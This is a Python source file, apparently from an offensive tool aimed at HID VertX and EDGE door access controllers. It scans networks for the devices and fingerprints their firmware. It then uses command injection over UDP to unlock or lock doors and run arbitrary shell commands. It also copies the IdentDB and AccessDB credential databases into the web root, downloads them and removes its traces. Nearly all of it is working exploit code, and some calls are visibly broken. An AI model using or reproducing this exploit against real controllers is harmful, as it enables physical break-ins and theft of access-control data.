# Copyright (c) 2016, Brandan Geise [coldfusion]
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import nmap
import requests
import socket
import time

from .helpers import Helpers

try:
	requests.packages.urllib3.disable_warnings()
except:
	pass


class Actions(object):
	"""
	Perform actions on VertX controller.
	"""
	def __init__(self, ip, username=None, password=None):
		self.utils = Helpers()
		self.session = requests.Session()
		self.HEADERS = {
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
			'Accept': '*/*',
			'Accept-Language': 'en-US,en;q=0.5',
			'Accept-Encoding': 'gzip, deflate',
			'Connection': 'close'
		}

		self.BLINK_ON = 'command_blink_on;044;'
		self.DISCOVER = 'discover;013;'

		self.ip = ip
		self.username = username
		self.password = password

		self.vertx_info = {}

	def discover(self):
		"""
		Discover VertX controllers on the local network or range of IP addresses.
		Returns
		----------
			controllers : list
		"""
		controllers = []

		# Send discover request to local broadcast network
		if self.ip == '255.255.255.255':
			vertx_info = self.fingerprint()
			if None not in vertx_info.values():
				controllers.append([vertx_info['external_ip'], '4070', vertx_info['mac']])
		else:
			# Check network range for open ports
			network_cidr = "{0}.0/24".format('.'.join(self.ip.split('.')[:-1]))
			nm = nmap.PortScanner()
			nm.scan(network_cidr, arguments='-n -sS -T2 --open -Pn -p4050')
			for host in nm.all_hosts():
				if nm[host].has_tcp(4050) and nm[host]['tcp'][4050]['state'] == 'open':
					self.ip = nm[host]['addresses']['ipv4']
					vertx_info = self.fingerprint()
					if None not in vertx_info.values():
						controllers.append([vertx_info['external_ip'], '4050', vertx_info['mac']])

		return controllers

	def fingerprint(self):
		"""
		Return information about the VertX controller.
		This also checks the firmware version and determines if the controller is vulnerable to command injection.
			Legacy VertX controllers patched with firmware > 2.2.7.568
			VertX EVO and EDGE EVO controllers patched with firmware > 3.5.1.1483
		Returns
		----------
			vertx_info : dict
		"""
		response = self._send_command(self.DISCOVER)
		if response:
			response_data = response[0].split(';')
			self.vertx_info['raw'] = response
			self.vertx_info['name'] = response_data[3]
			self.vertx_info['model'] = response_data[6]
			self.vertx_info['version'] = response_data[7]
			self.vertx_info['data'] = response_data[8]
			self.vertx_info['internal_ip'] = response_data[4]
			self.vertx_info['external_ip'] = response[1][0]
			self.vertx_info['mac'] = response_data[2]

			switch = {
				'E400': 3511483,  # EDGEPlus
				'EH400': 3511483,  # EDGE EVO
				'EHS400': 3511483,  # EDGE EVO Solo
				'ES400': 3511483,  # EDGEPlus Solo
				'V2-V1000': 3511483,  # VertX EVO
				'V2-V2000': 3511483,  # VertX EVO
				'V1000': 227568,  # VertX Legacy
				'V2000': 227568  # VertX Legacy
			}

			patched_version = switch.get(self.vertx_info['model'], 0)
			if int(self.vertx_info['version'].replace('.', '')) <= patched_version:
				self.vertx_info['vulnerable'] = True
			else:
				self.vertx_info['vulnerable'] = False

		return self.vertx_info

	def unlock(self):
		"""
		Using command injection, unlock doors connected to the VertX controller.
		Returns
		----------
			response : str
		"""
		commands = [
			"export QUERY_STRING=\"?ID=0&BoardType={0}&Description=Strike&Relay=1&Action=1\"".format(self.vertx_info['model']),
			'/mnt/apps/web/cgi-bin/diagnostics_execute.cgi',
			'chmod -x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi'
		]

		payload_chunks = self._chunk(commands)
		for chunk in payload_chunks:
			payload = "{0};1`echo '{1}' >> /tmp/a`;".format(self.vertx_info['mac'], chunk)
			response = self._send_command(self.BLINK_ON, payload)
			if response[0].split(';')[0] == 'ack':
				self.utils.print_status('Executing payload')
				response = self._execute_payload(self.vertx_info['mac'])

		return response

	def web_unlock(self):
		"""
		Using the web interface, unlock doors connected to the VertX controller.
		Returns
		----------
			response : str
		"""
		url = "http://{0}/cgi-bin/diagnostics_execute.cgi?ID=0&BoardType={1}&Description=Strike&Relay=1&Action=1&MS={3}406".format(self.vertx_info['external_ip'], self.vertx_info['model'], int(time.time())),
		response = self._web_request(url)

		return response

	def lock(self):
		"""
		Using command injection, lock doors connected to the VertX controller.
		Returns
		----------
			response : str
		"""
		commands = [
			'chmod +x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi',
			"export QUERY_STRING=\"?ID=0&BoardType={0}&Description=Strike&Relay=1&Action=0\"".format(self.vertx_info['model']),
			"/mnt/apps/web/cgi-bin/diagnostics_execute.cgi"
		]

		payload_chunks = self._chunk(commands)
		for chunk in payload_chunks:
			payload = "{0};1`echo '{1}' >> /tmp/a`;".format(self.vertx_info['mac'], chunk)
			response = self._send_command(self.BLINK_ON, payload)
			if response[0].split(';')[0] == 'ack':
				self.utils.print_status('Executing payload')
				response = self._execute_payload(self.vertx_info['mac'])

		return response

	def web_lock(self):
		"""
		Using the web interface, lock doors connected to the VertX controller.
		Returns
		----------
			response : str
		"""
		url = "http://{0}/cgi-bin/diagnostics_execute.cgi?ID=0&BoardType={1}&Description=Strike&Relay=1&Action=0&MS={3}406".format(self.vertx_info['external_ip'], self.vertx_info['model'], int(time.time())),
		response = self.web_request(url)

		return response

	def raw(self, command):
		"""
		Send 'raw' native Linux command to be run on the VertX controller.
		Parameters
		----------
		command : str
			Linux command.
			Example : ping -c 3 192.168.1.39
		Returns
		----------
			response : str
		"""
		payload = "{0};1`{1}`;".format(self.vertx_info['mac'], command)
		response = self._send_command(self.BLINK_ON, payload)

		return response

	def download(self):
		"""
		Download IdentDB and AccessDB from VertX controller.
		Returns
		----------
			databases : dict
		"""
		databases = {
			'IdentDB': None,
			'AccessDB': None
		}

		commands = [
			'cp /mnt/data/config/IdentDB /mnt/apps/web/',
			'cp /mnt/data/config/AccessDB /mnt/apps/web/',
			'sleep 15',
			'rm /mnt/apps/web/IdentDB',
			'rm /mnt/apps/web/AccessDB'
		]

		payload_chunks = self._chunk(commands)
		for chunk in payload_chunks:
			payload = "{0};1`echo '{1}' >> /tmp/a`;".format(self.vertx_info['mac'], chunk)
			response = self._send_command(self.BLINK_ON, payload)
			if response[0].split(';')[0] != 'ack':
				return databases

		for database in databases:
			try:
				response = self.session.get(
					"http://{0}/{1}".format(self.ip, database),
					headers=self.HEADERS,
					auth=(self.username, self.password),
					stream=True,
					verify=False
				)

			except requests.exceptions.RequestException as error:
				raise Exception(error)
			else:
				if response.status_code == 200:
					databases[database] = True
					with open(database, 'wb') as f:
						for chunk in response.iter_content(chunk_size=1024):
							f.write(chunk)
					f.close()
				elif response.status_code == 401:
					databases[database] = False
				else:
					databases[database] = None

		return databases

	def _chunk(self, commands, length=24):
		"""
		Split commands into chunks because of 41 character length limit with command injection.
		Parameters
		----------
			commands : list
				Commands to send to the VertX controller.
			length : int
				Lengeth of chunks.
		Returns
		----------
			list
		"""
		return list('!'.join(commands)[0 + i:length + i] for i in range(0, len('!'.join(commands)), length))

	def _execute_payload(self):
		"""
		Format the uploaded script, then execute.
		Returns
		----------
			response : str
		"""
		commands = {
			'format': [
				"{0};1`tr -d '\n' < /tmp/a > /tmp/b`;".format(self.vertx_info['mac']),
				"{0};1`tr '!' '\n' < /tmp/b > /tmp/a`;".format(self.vertx_info['mac']),
				"{0};1`chmod +x /tmp/a`;".format(self.vertx_info['mac']),
				"{0};1`/tmp/a`;".format(self.vertx_info['mac'])
			],
			'remove': [
				"{0};1`rm /tmp/a`;".format(self.vertx_info['mac']),
				"{0};1`rm /tmp/b`;".format(self.vertx_info['mac'])
			]
		}

		for payload in commands['format']:
			response = self._send_command(self.BLINK_ON, payload)

		self.utils.print_status('Sleeping for 10 seconds before cleaning up')
		time.sleep(10)

		for payload in commands['remove']:
			response = self._send_command(self.BLINK_ON, payload)

		return response

	def _send_command(self, command, payload=None):
		"""
		Send a command to VertX controller.
		Parameters
		----------
			commands : str
				Command to send to the VertX controller.
			payload : str
				Command injection payload.
		Returns
		----------
			response : str
		"""
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		s.settimeout(5)

		if self.ip == '255.255.255.255':
			s.bind(('', 0))
			s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

		if payload:
			payload_buffer = "{0}{1}".format(command, payload)
		else:
			payload_buffer = command

		try:
			s.sendto(payload_buffer, (self.ip, 4070))
			response = s.recvfrom(1024)
			s.close()
		except socket.timeout:
			raise Exception('VertX controller did not respond')

		return response

	def _web_request(self, url):
		"""
		Trigger door unlock and lock through the web interface.
		Parameters
		----------
			url : str
				URL endpont to trigger on the VertX web interface.
		Returns
		----------
			response : str
		"""
		try:
			request = self.session.get(
				url,
				headers=self.HEADERS,
				auth=(self.username, self.password),
				verify=False
			)
			response = dict(status=request.status.code, text=request.text)
		except requests.exceptions.RequestException as error:
			response = None

		return response
